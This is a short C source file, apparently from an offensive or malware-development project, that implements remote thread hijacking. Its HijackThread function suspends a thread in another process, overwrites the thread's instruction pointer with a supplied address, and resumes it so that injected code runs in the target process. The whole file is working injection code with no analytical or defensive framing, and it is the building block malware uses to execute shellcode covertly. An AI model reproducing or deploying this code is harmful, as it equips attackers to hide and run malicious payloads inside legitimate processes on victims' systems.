#include "RemoteThreadHijacking.h"

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	CONTEXT ThreadCtx = { 0 };

	ThreadCtx.ContextFlags = CONTEXT_ALL;

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed with an Error: %ld\n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed with an Error: %ld\n", GetLastError());
		return FALSE;
	}

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;

}